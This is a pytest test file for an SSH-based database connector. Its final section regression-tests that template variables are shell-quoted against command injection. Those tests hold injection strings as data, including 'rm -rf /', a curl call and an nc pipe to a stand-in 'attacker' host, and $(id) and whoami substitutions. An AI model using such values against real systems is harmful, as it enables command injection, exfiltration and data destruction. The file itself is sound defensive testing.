from dataclasses import dataclass
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.connectors.base import ConnectionConfig
from app.connectors.ssh_exec import SSHExecConnector


@dataclass
class FakeSSHResult:
    stdout: str = ""
    stderr: str = ""
    exit_status: int = 0


def make_config(**overrides) -> ConnectionConfig:
    defaults = dict(
        db_type="mysql",
        db_host="127.0.0.1",
        db_port=3306,
        db_name="testdb",
        db_user="testuser",
        db_password="testpass",
        ssh_host="10.0.0.1",
        ssh_port=22,
        ssh_user="deploy",
        ssh_key_content="fake-key",
        ssh_exec_mode=True,
    )
    defaults.update(overrides)
    return ConnectionConfig(**defaults)


class TestSSHExecConnectorBuildCommand:
    def test_build_query_command_pipes_via_stdin(self):
        connector = SSHExecConnector()
        connector._config = make_config()
        cmd, _ = connector._build_command("query", "SELECT 1")
        assert "echo" in cmd
        assert "SELECT 1" in cmd
        assert "|" in cmd

    def test_build_command_with_pre_commands(self):
        connector = SSHExecConnector()
        connector._config = make_config(
            ssh_pre_commands=["source ~/.bashrc", "export PATH=/usr/local/bin:$PATH"]
        )
        cmd, _ = connector._build_command("query", "SELECT 1")
        assert "source ~/.bashrc" in cmd
        assert "export PATH" in cmd
        assert " && " in cmd

    def test_build_test_command(self):
        connector = SSHExecConnector()
        connector._config = make_config()
        cmd, _ = connector._build_command("test")
        assert "SELECT 1" in cmd

    def test_custom_template(self):
        connector = SSHExecConnector()
        connector._config = make_config(ssh_command_template="custom-cli -d {db_name} -u {db_user}")
        cmd, _ = connector._build_command("query", "SELECT 1")
        assert "custom-cli -d testdb -u testuser" in cmd

    def test_query_with_single_quotes_escaped(self):
        connector = SSHExecConnector()
        connector._config = make_config()
        cmd, _ = connector._build_command("query", "SELECT * FROM t WHERE name = 'alice'")
        assert "alice" in cmd


class TestSSHExecConnectorConnect:
    @pytest.mark.asyncio
    @patch("app.connectors.ssh_exec.connect_with_policy", new_callable=AsyncMock)
    @patch("app.connectors.ssh_exec.asyncssh")
    async def test_connect_success(self, mock_asyncssh, mock_connect_policy):
        mock_conn = MagicMock()
        mock_connect_policy.return_value = mock_conn
        mock_asyncssh.import_private_key = MagicMock(return_value="key-obj")

        connector = SSHExecConnector()
        config = make_config()
        await connector.connect(config)

        mock_connect_policy.assert_awaited_once()
        assert connector._conn is mock_conn
        assert connector._config is config

    @pytest.mark.asyncio
    async def test_connect_requires_ssh_host(self):
        connector = SSHExecConnector()
        config = make_config(ssh_host=None)
        with pytest.raises(ValueError, match="SSH host is required"):
            await connector.connect(config)


class TestSSHExecConnectorExecuteQuery:
    @pytest.mark.asyncio
    @patch("app.connectors.ssh_exec.connect_with_policy", new_callable=AsyncMock)
    @patch("app.connectors.ssh_exec.asyncssh")
    async def test_execute_query_success(self, mock_asyncssh, mock_connect_policy):
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=FakeSSHResult(
                stdout="id\tname\n1\talice\n2\tbob\n",
                exit_status=0,
            )
        )
        mock_connect_policy.return_value = mock_conn
        mock_asyncssh.import_private_key = MagicMock(return_value="key-obj")

        connector = SSHExecConnector()
        await connector.connect(make_config())
        result = await connector.execute_query("SELECT id, name FROM users")

        assert result.error is None
        assert result.columns == ["id", "name"]
        assert result.row_count == 2
        assert result.rows == [["1", "alice"], ["2", "bob"]]

    @pytest.mark.asyncio
    @patch("app.connectors.ssh_exec.connect_with_policy", new_callable=AsyncMock)
    @patch("app.connectors.ssh_exec.asyncssh")
    async def test_execute_query_error(self, mock_asyncssh, mock_connect_policy):
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=FakeSSHResult(
                stdout="",
                stderr="ERROR 1045: Access denied",
                exit_status=1,
            )
        )
        mock_connect_policy.return_value = mock_conn
        mock_asyncssh.import_private_key = MagicMock(return_value="key-obj")

        connector = SSHExecConnector()
        await connector.connect(make_config())
        result = await connector.execute_query("SELECT 1")

        assert result.error is not None
        assert "Access denied" in result.error

    @pytest.mark.asyncio
    @patch("app.connectors.ssh_exec.connect_with_policy", new_callable=AsyncMock)
    @patch("app.connectors.ssh_exec.asyncssh")
    async def test_execute_query_empty_result(self, mock_asyncssh, mock_connect_policy):
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=FakeSSHResult(
                stdout="",
                exit_status=0,
            )
        )
        mock_connect_policy.return_value = mock_conn
        mock_asyncssh.import_private_key = MagicMock(return_value="key-obj")

        connector = SSHExecConnector()
        await connector.connect(make_config())
        result = await connector.execute_query("SELECT * FROM empty_table")

        assert result.error is None
        assert result.row_count == 0


class TestSSHExecConnectorTestConnection:
    @pytest.mark.asyncio
    @patch("app.connectors.ssh_exec.connect_with_policy", new_callable=AsyncMock)
    @patch("app.connectors.ssh_exec.asyncssh")
    async def test_test_connection_ok(self, mock_asyncssh, mock_connect_policy):
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=FakeSSHResult(
                stdout="ok\n1\n",
                exit_status=0,
            )
        )
        mock_connect_policy.return_value = mock_conn
        mock_asyncssh.import_private_key = MagicMock(return_value="key-obj")

        connector = SSHExecConnector()
        await connector.connect(make_config())
        assert await connector.test_connection() is True

    @pytest.mark.asyncio
    @patch("app.connectors.ssh_exec.connect_with_policy", new_callable=AsyncMock)
    @patch("app.connectors.ssh_exec.asyncssh")
    async def test_test_connection_fail(self, mock_asyncssh, mock_connect_policy):
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=FakeSSHResult(
                stderr="connection refused",
                exit_status=1,
            )
        )
        mock_connect_policy.return_value = mock_conn
        mock_asyncssh.import_private_key = MagicMock(return_value="key-obj")

        connector = SSHExecConnector()
        await connector.connect(make_config())
        assert await connector.test_connection() is False


class TestSSHExecConnectorTestSshOnly:
    @pytest.mark.asyncio
    @patch("app.connectors.ssh_exec.connect_with_policy", new_callable=AsyncMock)
    @patch("app.connectors.ssh_exec.asyncssh")
    async def test_test_ssh_only_success(self, mock_asyncssh, mock_connect_policy):
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=FakeSSHResult(
                stdout="__SSH_EXEC_TEST__\nserver-01\n",
                exit_status=0,
            )
        )
        mock_connect_policy.return_value = mock_conn
        mock_asyncssh.import_private_key = MagicMock(return_value="key-obj")

        connector = SSHExecConnector()
        await connector.connect(make_config())
        result = await connector.test_ssh_only()

        assert result["success"] is True
        assert result["hostname"] == "server-01"


class TestRegistryWithExecMode:
    def test_exec_mode_returns_ssh_exec_connector(self):
        from app.connectors.registry import get_connector

        conn = get_connector("mysql", ssh_exec_mode=True)
        assert isinstance(conn, SSHExecConnector)

    def test_normal_mode_returns_mysql(self):
        from app.connectors.mysql import MySQLConnector
        from app.connectors.registry import get_connector

        conn = get_connector("mysql", ssh_exec_mode=False)
        assert isinstance(conn, MySQLConnector)


# ---------------------------------------------------------------------------
# F-SSH-04: `db_port` is the one template var excluded from escaping
# ---------------------------------------------------------------------------


class TestTemplateVarsAreShellQuoted:
    """`format_template`'s `_escape_keys` is `{db_name, db_user, db_host, db_password}`
    (`exec_templates.py:198`) — `db_port` is deliberately absent, which is exactly what
    the finding names.

    It was **not exploitable**, and the tests below say why: the request schema bounds
    it (`db_port: int | None = Field(ge=1, le=65535)`, `routes/connections.py:371,446`),
    the column is `Integer`, and both `ConnectionConfig` construction sites build from
    the model. A metacharacter has no path in. Escaping it anyway costs nothing —
    `shlex.quote` of digits returns the digits — and replaces a guarantee spread across
    three files and two call sites with one that holds locally.
    """

    @staticmethod
    def _cmd(**overrides) -> str:
        connector = SSHExecConnector()
        connector._config = make_config(**overrides)
        cmd, _ = connector._build_command("query", "SELECT 1")
        return cmd

    def test_db_port_is_escaped_like_every_other_template_var(self):
        from app.connectors.exec_templates import format_template

        out = format_template("client -P {db_port}", {"db_port": "3306; rm -rf /"})
        assert "; rm -rf /" not in out.replace("'3306; rm -rf /'", ""), out

    def test_an_ordinary_port_is_unchanged_by_escaping(self):
        """Quoting must not turn a working command into a different one."""
        cmd = self._cmd(db_port=3306)
        assert "-P 3306" in cmd, cmd

    def test_the_free_string_vars_were_already_escaped(self):
        """Locks in what F-SSH-02's rewrite already established, so it cannot regress."""
        assert "'db; curl http://attacker/x'" in self._cmd(db_name="db; curl http://attacker/x")
        assert "'root$(id)'" in self._cmd(db_user="root$(id)")
        assert "'h`whoami`'" in self._cmd(db_host="h`whoami`")

    def test_a_quoted_value_adds_no_pipeline_stage(self):
        """One pipe, the legitimate stdin one — the value's pipe stays inside quotes."""
        cmd = self._cmd(db_name="db|nc attacker 1")
        assert "'db|nc attacker 1'" in cmd, cmd
        assert cmd.count("| MYSQL_PWD") == 1, cmd

    def test_a_missing_user_renders_an_explicit_empty_argument(self):
        cmd = self._cmd(db_user=None)
        assert "-u ''" in cmd, cmd
